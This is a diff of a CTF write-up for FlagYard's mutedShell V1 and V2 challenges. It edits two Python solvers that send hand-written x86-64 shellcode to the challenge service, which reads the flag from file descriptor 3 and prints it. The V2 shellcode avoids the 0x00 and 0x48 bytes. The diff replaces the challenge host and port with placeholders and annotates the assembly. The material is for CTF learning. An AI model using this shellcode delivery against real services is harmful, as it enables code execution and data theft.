@@ -112,27 +112,36 @@ b8 3c 00 00 00
 - Prints whatever the service returns (the flag).
 
 ```python
-#!/usr/bin/env python3
-# solve_mutedshell_v1.py — FlagYard mutedShell V1
-# Strategy: read(fd=3)->stack, write(stdout)->stack, exit
-
 import socket
 
-HOST = "34.252.33.37"
-PORT = 31886
+HOST = "" # Replace This
+PORT = 0 # Replace This
 
+# pre-assembled x86-64 shellcode:
+#   xor rax, rax
+#   mov rdi, 3
+#   mov rsi, rsp
+#   mov rdx, 0x400
+#   syscall                  ; read(3, rsp, 0x400)
+#   mov rdx, rax
+#   mov eax, 1
+#   mov edi, 1
+#   syscall                  ; write(1, rsp, rax)
+#   mov eax, 60
+#   xor edi, edi
+#   syscall                  ; exit(0)
 shellcode = (
     b"\x48\x31\xc0"                          # xor rax, rax
     b"\x48\xc7\xc7\x03\x00\x00\x00"          # mov rdi, 3
     b"\x48\x89\xe6"                          # mov rsi, rsp
     b"\x48\xc7\xc2\x00\x04\x00\x00"          # mov rdx, 0x400
     b"\x0f\x05"                              # syscall (read)
-    b"\x48\x91"                              # xchg rax, rdx  (rdx=bytes_read)
-    b"\xb0\x01"                              # mov al, 1      (rax=write)
-    b"\xbf\x01\x00\x00\x00"                  # mov edi, 1     (stdout)
+    b"\x48\x89\xc2"                          # mov rdx, rax
+    b"\xb8\x01\x00\x00\x00"                  # mov eax, 1
+    b"\xbf\x01\x00\x00\x00"                  # mov edi, 1
     b"\x0f\x05"                              # syscall (write)
-    b"\xb8\x3c\x00\x00\x00"                  # mov eax, 60    (exit)
-    b"\x31\xff"                              # xor edi, edi   (status=0)
+    b"\xb8\x3c\x00\x00\x00"                  # mov eax, 60
+    b"\x31\xff"                              # xor edi, edi
     b"\x0f\x05"                              # syscall (exit)
 )
 
@@ -149,26 +158,29 @@ def recv_until(sock, token: bytes, timeout=5.0):
         pass
     return data
 
-def recvall(sock, timeout=5.0):
+def recvall(sock, timeout=3.0):
     sock.settimeout(timeout)
     chunks = []
     while True:
         try:
-            b = sock.recv(4096)
-            if not b:
+            chunk = sock.recv(4096)
+            if not chunk:
                 break
-            chunks.append(b)
+            chunks.append(chunk)
         except socket.timeout:
             break
     return b"".join(chunks)
 
 def main():
     with socket.create_connection((HOST, PORT), timeout=5.0) as s:
-        _ = recv_until(s, b"Send your shellcode:")
+        _banner = recv_until(s, b"Send your shellcode:")
         s.sendall(shellcode)
         out = recvall(s, timeout=5.0)
         if out:
-            print(out.decode("utf-8", errors="replace").strip())
+            try:
+                print(out.decode("utf-8", errors="replace").strip())
+            except Exception:
+                print(repr(out))
 
 if __name__ == "__main__":
     main()
@@ -233,36 +245,53 @@ Why this works:
 ## Minimal Python solver (V2)
 
 ```python
-#!/usr/bin/env python3
-# solve_mutedshell_v2.py — FlagYard mutedShell V2
-# Constraints: no byte 0x48 or 0x00 in shellcode
-
 import socket
 
-HOST = "34.252.33.37"
-PORT = 31886
+HOST = "" # Replace with actual host
+PORT = 0 # Replace with actual port
 
+# Shellcode (no 0x00 or 0x48 bytes):
+#   push rsp           ; 54
+#   pop rsi            ; 5e
+#   xor eax, eax       ; 31 c0                ; rax = SYS_read (0)
+#   push 3             ; 6a 03
+#   pop rdi            ; 5f                   ; rdi = 3 (flag fd)
+#   xor edx, edx       ; 31 d2
+#   inc edx            ; ff c2                ; edx = 1
+#   shl edx, 8         ; c1 e2 08             ; edx = 0x100
+#   shl edx, 2         ; c1 e2 02             ; edx = 0x400
+#   syscall            ; 0f 05                ; read(3, rsp, 0x400)
+#   mov edx, eax       ; 89 c2                ; rdx = bytes_read
+#   xor eax, eax       ; 31 c0
+#   inc eax            ; ff c0                ; rax = SYS_write (1)
+#   push 1             ; 6a 01
+#   pop rdi            ; 5f                   ; rdi = 1 (stdout)
+#   syscall            ; 0f 05                ; write(1, rsp, n)
+#   push 60            ; 6a 3c
+#   pop rax            ; 58                   ; rax = SYS_exit (60)
+#   xor edi, edi       ; 31 ff                ; rdi = 0
+#   syscall            ; 0f 05                ; exit(0)
 shellcode = (
-    b"\x54"                # push rsp
-    b"\x5e"                # pop rsi
-    b"\x31\xc0"            # xor eax, eax
-    b"\x6a\x03"            # push 3
-    b"\x5f"                # pop rdi
-    b"\x31\xd2"            # xor edx, edx
-    b"\xff\xc2"            # inc edx
-    b"\xc1\xe2\x08"        # shl edx, 8
-    b"\xc1\xe2\x02"        # shl edx, 2   -> 0x400
-    b"\x0f\x05"            # syscall      ; read
-    b"\x89\xc2"            # mov edx, eax ; bytes_read
-    b"\x31\xc0"            # xor eax, eax
-    b"\xff\xc0"            # inc eax      ; rax=1 (write)
-    b"\x6a\x01"            # push 1
-    b"\x5f"                # pop rdi      ; stdout
-    b"\x0f\x05"            # syscall      ; write
-    b"\x6a\x3c"            # push 60
-    b"\x58"                # pop rax      ; exit
-    b"\x31\xff"            # xor edi, edi
-    b"\x0f\x05"            # syscall      ; exit(0)
+    b"\x54"
+    b"\x5e"
+    b"\x31\xc0"
+    b"\x6a\x03"
+    b"\x5f"
+    b"\x31\xd2"
+    b"\xff\xc2"
+    b"\xc1\xe2\x08"
+    b"\xc1\xe2\x02"
+    b"\x0f\x05"
+    b"\x89\xc2"
+    b"\x31\xc0"
+    b"\xff\xc0"
+    b"\x6a\x01"
+    b"\x5f"
+    b"\x0f\x05"
+    b"\x6a\x3c"
+    b"\x58"
+    b"\x31\xff"
+    b"\x0f\x05"
 )
 
 def recv_until(sock, token: bytes, timeout=5.0):
@@ -283,23 +312,24 @@ def recvall(sock, timeout=5.0):
     chunks = []
     while True:
         try:
-            b = sock.recv(4096)
-            if not b:
+            chunk = sock.recv(4096)
+            if not chunk:
                 break
-            chunks.append(b)
+            chunks.append(chunk)
         except socket.timeout:
             break
     return b"".join(chunks)
 
 def main():
-    # Quick sanity: ensure payload has neither 0x48 nor 0x00
-    assert b"\x48" not in shellcode and b"\x00" not in shellcode
     with socket.create_connection((HOST, PORT), timeout=5.0) as s:
         _ = recv_until(s, b"Send your shellcode:")
         s.sendall(shellcode)
         out = recvall(s, timeout=5.0)
         if out:
-            print(out.decode("utf-8", errors="replace").strip())
+            try:
+                print(out.decode("utf-8", errors="replace").strip())
+            except Exception:
+                print(repr(out))
 
 if __name__ == "__main__":
     main()
